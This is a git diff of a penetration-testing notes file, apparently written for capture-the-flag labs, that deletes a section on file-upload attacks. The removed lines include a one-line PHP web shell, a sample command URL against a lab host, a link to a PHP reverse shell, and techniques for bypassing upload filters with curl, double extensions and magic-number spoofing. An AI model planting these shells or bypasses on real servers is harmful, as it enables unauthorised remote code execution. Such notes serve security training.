@@ -1,4 +1,4 @@
-# Enumeration
+- [ ] # Enumeration
 
 ## Scan
 
@@ -590,64 +590,3 @@ This will change the registered width and height of the terminal, thus allowing 
 
 ---
 
-## WebShells RCE Upload Vulnerabilities
-
-there are a variety of webshells available on Kali by default at `/usr/share/webshells` -- including the infamous [PentestMonkey php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) -- a full reverse shell written in PHP
-
-```
-<?php
-    echo system($_GET["cmd"]);
-?>
-```
-
-- add this to a web directory with a filename like 'webshell.php'
-- then navigate to the file you uploaded and add to the url your console cmd
-  
->e.g. `http://shell.uploadvulns.thm/resources/webshell.php?cmd=id;whoami;ls`
-
-then from here we can upload an RCE
-
->https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
-
-When the target is ***Windows***, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server. 
-To obtain RCE using a web shell you need to use ***URL Encoded Powershell Reverse Shell***. This would be copied into the URL as the `cmd` argument:
-
----
-
-### Client-side filtering and server-side filtering
-
-- Extension Validation
-- File Type Filtering
-  - MIME validation
-  - Magic Number validation
-- File Length Filtering
-- File Name Filtering
-- File Content Filtering
-
----
-
-## Bypass file filtering
-
-### Send the file directly to the upload point
-
-Why use the webpage with the filter, when you can send the file directly using a tool like curl?
-
-```
-curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>
-```
-
->To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command.
-
-## Bypassing Server-Side Filtering
-
->first step, google alternate extensions e.g. https://en.wikipedia.org/wiki/PHP
-
-The key to bypassing any kind of server side filter is to enumerate and see what is allowed, as well as what is blocked; then try to craft a payload which can pass the criteria the filter is looking for.
-
-append a file type e.g. `webshell.jpg.php`
-collect a burpsuite capture to delete the filter either *before* the page loads *or before* the file is uploaded
-
-### Bypassing using magic numbers
-
-- use nano to add "A" the correct number of times to the start of the file
-- use hexeditor to change those characters to magic numbers associated to the target file type
